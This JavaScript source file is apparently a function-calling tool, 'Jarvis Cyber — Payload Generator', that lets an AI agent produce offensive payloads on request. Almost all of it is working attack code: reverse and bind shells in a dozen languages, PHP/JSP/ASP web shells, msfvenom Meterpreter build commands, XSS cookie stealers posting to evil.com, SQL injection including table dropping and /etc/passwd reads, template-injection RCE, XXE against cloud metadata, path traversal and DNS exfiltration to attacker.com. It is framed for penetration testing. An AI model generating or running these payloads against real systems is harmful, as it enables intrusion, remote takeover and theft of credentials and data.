// Jarvis Cyber — Payload Generator
export const definition = {
  type: 'function',
  function: {
    name: 'payload_generate',
    description: 'Generate various payloads for penetration testing. Includes reverse shells (Bash, Python, PHP, Perl, NC, PowerShell), web shells, bind shells, encoded payloads, msfvenom commands, and XSS/SQLi test vectors.',
    parameters: {
      type: 'object',
      properties: {
        type: {
          type: 'string',
          enum: ['reverse_shell', 'bind_shell', 'web_shell', 'msfvenom', 'xss', 'sqli', 'ssti', 'xxe', 'lfi', 'rce'],
          description: 'Payload type'
        },
        language: { type: 'string', description: 'Language/format: bash, python, php, perl, ruby, powershell, java, node, nc, socat' },
        lhost: { type: 'string', description: 'Listener host IP (for reverse shells)' },
        lport: { type: 'integer', description: 'Listener port (default: 4444)' },
        target_os: { type: 'string', enum: ['linux', 'windows'], description: 'Target OS (default: linux)' },
        encode: { type: 'string', enum: ['none', 'base64', 'url', 'hex'], description: 'Payload encoding (default: none)' }
      },
      required: ['type']
    }
  }
};

export async function execute(args) {
  const { type, language, lhost = '0.0.0.0', lport = 4444, target_os = 'linux', encode = 'none' } = args;

  let payloads = [];

  switch (type) {
    case 'reverse_shell':
      payloads = _reverseShells(lhost, lport, language, target_os);
      break;
    case 'bind_shell':
      payloads = _bindShells(lport, language);
      break;
    case 'web_shell':
      payloads = _webShells(language);
      break;
    case 'msfvenom':
      payloads = _msfvenomCommands(lhost, lport, target_os);
      break;
    case 'xss':
      payloads = _xssPayloads();
      break;
    case 'sqli':
      payloads = _sqliPayloads();
      break;
    case 'ssti':
      payloads = _sstiPayloads();
      break;
    case 'xxe':
      payloads = _xxePayloads();
      break;
    case 'lfi':
      payloads = _lfiPayloads();
      break;
    case 'rce':
      payloads = _rcePayloads();
      break;
    default:
      return { success: false, error: `Unknown payload type: ${type}` };
  }

  // Apply encoding
  if (encode !== 'none') {
    payloads = payloads.map(p => ({
      ...p,
      encoded: _encode(p.payload, encode),
      encoding: encode
    }));
  }

  return {
    success: true,
    type,
    lhost,
    lport,
    count: payloads.length,
    payloads
  };
}

function _reverseShells(lhost, lport, lang, os) {
  const shells = [];
  const add = (name, payload) => { if (!lang || lang === name.toLowerCase().split(' ')[0]) shells.push({ name, payload }); };

  add('Bash TCP', `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`);
  add('Bash UDP', `bash -i >& /dev/udp/${lhost}/${lport} 0>&1`);
  add('Python', `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`);
  add('Python Windows', `python -c "import socket,subprocess;s=socket.socket();s.connect(('${lhost}',${lport}));[subprocess.Popen(['cmd'],stdin=s,stdout=s,stderr=s)]"`);
  add('PHP', `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`);
  add('Perl', `perl -e 'use Socket;$i="${lhost}";$p=${lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`);
  add('Ruby', `ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("${lhost}",${lport}))'`);
  add('NC', `nc -e /bin/sh ${lhost} ${lport}`);
  add('NC OpenBSD', `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`);
  add('Socat', `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${lhost}:${lport}`);
  add('Node', `require('child_process').exec('bash -c "bash -i >& /dev/tcp/${lhost}/${lport} 0>&1"')`);
  add('PowerShell', `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${lhost}',${lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`);
  add('Java', `Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/${lhost}/${lport} 0>&1"})`);
  add('Lua', `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${lhost}','${lport}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`);
  add('Xterm', `xterm -display ${lhost}:1`);

  return lang ? shells : shells;
}

function _bindShells(port, lang) {
  return [
    { name: 'Python Bind', payload: `python3 -c 'import socket,os;s=socket.socket();s.bind(("0.0.0.0",${port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);os.system("/bin/sh")'` },
    { name: 'NC Bind', payload: `nc -lvp ${port} -e /bin/sh` },
    { name: 'Socat Bind', payload: `socat TCP-LISTEN:${port},reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane` },
    { name: 'PHP Bind', payload: `php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",${port});socket_listen($s);$c=socket_accept($s);while(1){$cmd=socket_read($c,2048);$o=shell_exec($cmd);socket_write($c,$o,strlen($o));}'` },
  ];
}

function _webShells(lang) {
  return [
    { name: 'PHP Simple', payload: `<?php system($_GET['cmd']); ?>` },
    { name: 'PHP Eval', payload: `<?php eval($_POST['e']); ?>` },
    { name: 'PHP Stealth', payload: `<?php $k='cmd';if(isset($_REQUEST[$k])){$c=$_REQUEST[$k];echo '<pre>'.shell_exec($c).'</pre>';}?>` },
    { name: 'JSP', payload: `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>` },
    { name: 'ASP', payload: `<% eval request("cmd") %>` },
    { name: 'Python Flask', payload: `import os;os.popen(request.args.get('cmd','id')).read()` },
    { name: 'Node.js', payload: `require('child_process').execSync(req.query.cmd).toString()` },
  ];
}

function _msfvenomCommands(lhost, lport, os) {
  if (os === 'windows') {
    return [
      { name: 'Windows Meterpreter (exe)', payload: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe -o shell.exe` },
      { name: 'Windows Meterpreter x64', payload: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe -o shell64.exe` },
      { name: 'Windows Shell (exe)', payload: `msfvenom -p windows/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe -o rshell.exe` },
      { name: 'Windows DLL', payload: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f dll -o payload.dll` },
      { name: 'Windows MSI', payload: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f msi -o payload.msi` },
      { name: 'Windows HTA', payload: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f hta-psh -o payload.hta` },
    ];
  }
  return [
    { name: 'Linux Meterpreter (elf)', payload: `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f elf -o shell.elf` },
    { name: 'Linux Shell (elf)', payload: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f elf -o rshell.elf` },
    { name: 'Linux x64 Meterpreter', payload: `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f elf -o shell64.elf` },
    { name: 'PHP Meterpreter', payload: `msfvenom -p php/meterpreter_reverse_tcp LHOST=${lhost} LPORT=${lport} -f raw -o shell.php` },
    { name: 'Python Meterpreter', payload: `msfvenom -p python/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f raw -o shell.py` },
    { name: 'War (Tomcat)', payload: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f war -o shell.war` },
  ];
}

function _xssPayloads() {
  return [
    { name: 'Basic Alert', payload: `<script>alert('XSS')</script>` },
    { name: 'IMG Onerror', payload: `<img src=x onerror=alert('XSS')>` },
    { name: 'SVG Onload', payload: `<svg onload=alert('XSS')>` },
    { name: 'Event Handler', payload: `<body onload=alert('XSS')>` },
    { name: 'Input Autofocus', payload: `<input autofocus onfocus=alert('XSS')>` },
    { name: 'Iframe', payload: `<iframe src="javascript:alert('XSS')">` },
    { name: 'Cookie Stealer', payload: `<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>` },
    { name: 'DOM XSS', payload: `<script>document.location='http://evil.com/?c='+document.cookie</script>` },
    { name: 'Polyglot', payload: `jaVasCript:/*-/*\`/*\\'\`/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>\\x3e` },
    { name: 'CSP Bypass', payload: `<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script><div ng-app ng-csp><p>{{constructor.constructor('alert(1)')()}}</p></div>` },
  ];
}

function _sqliPayloads() {
  return [
    { name: 'Auth Bypass', payload: `' OR '1'='1` },
    { name: 'Auth Bypass 2', payload: `' OR 1=1--` },
    { name: 'Union Select', payload: `' UNION SELECT NULL,NULL,NULL--` },
    { name: 'Version (MySQL)', payload: `' UNION SELECT @@version--` },
    { name: 'Version (MSSQL)', payload: `' UNION SELECT @@version--` },
    { name: 'Tables (MySQL)', payload: `' UNION SELECT table_name,NULL FROM information_schema.tables--` },
    { name: 'Columns (MySQL)', payload: `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--` },
    { name: 'Time-based Blind', payload: `' AND SLEEP(5)--` },
    { name: 'Boolean Blind', payload: `' AND 1=1--` },
    { name: 'Error-based', payload: `' AND extractvalue(1,concat(0x7e,version()))--` },
    { name: 'Stacked Queries', payload: `'; DROP TABLE users;--` },
    { name: 'File Read (MySQL)', payload: `' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--` },
  ];
}

function _sstiPayloads() {
  return [
    { name: 'Jinja2 (Python)', payload: `{{7*7}}` },
    { name: 'Jinja2 RCE', payload: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` },
    { name: 'Twig (PHP)', payload: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` },
    { name: 'Freemarker (Java)', payload: `<#assign ex="freemarker.template.utility.Execute"?new()> \${ ex("id") }` },
    { name: 'Mako (Python)', payload: `\${__import__('os').popen('id').read()}` },
    { name: 'Pebble (Java)', payload: `{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}` },
  ];
}

function _xxePayloads() {
  return [
    { name: 'Classic XXE', payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>` },
    { name: 'XXE OOB', payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo>test</foo>` },
    { name: 'XXE SSRF', payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>` },
    { name: 'XXE Base64', payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>` },
  ];
}

function _lfiPayloads() {
  return [
    { name: 'Basic LFI', payload: `../../../../etc/passwd` },
    { name: 'Null Byte', payload: `../../../../etc/passwd%00` },
    { name: 'Double Encoding', payload: `..%252f..%252f..%252f..%252fetc/passwd` },
    { name: 'PHP Filter', payload: `php://filter/convert.base64-encode/resource=index.php` },
    { name: 'PHP Input', payload: `php://input` },
    { name: 'Log Poisoning', payload: `/var/log/apache2/access.log` },
    { name: 'Windows', payload: `..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts` },
    { name: 'Proc Self', payload: `/proc/self/environ` },
  ];
}

function _rcePayloads() {
  return [
    { name: 'Command Injection', payload: `; id` },
    { name: 'Pipe Injection', payload: `| id` },
    { name: 'Backtick', payload: '`id`' },
    { name: 'Dollar Subshell', payload: `$(id)` },
    { name: 'Newline', payload: `%0aid` },
    { name: 'URL Encoded', payload: `%3B%20id` },
    { name: 'Chained', payload: `; id; whoami; uname -a` },
    { name: 'Time-based', payload: `; sleep 10` },
    { name: 'DNS Exfil', payload: `; nslookup $(whoami).attacker.com` },
  ];
}

function _encode(payload, method) {
  switch (method) {
    case 'base64': return Buffer.from(payload).toString('base64');
    case 'url': return encodeURIComponent(payload);
    case 'hex': return Buffer.from(payload).toString('hex');
    default: return payload;
  }
}
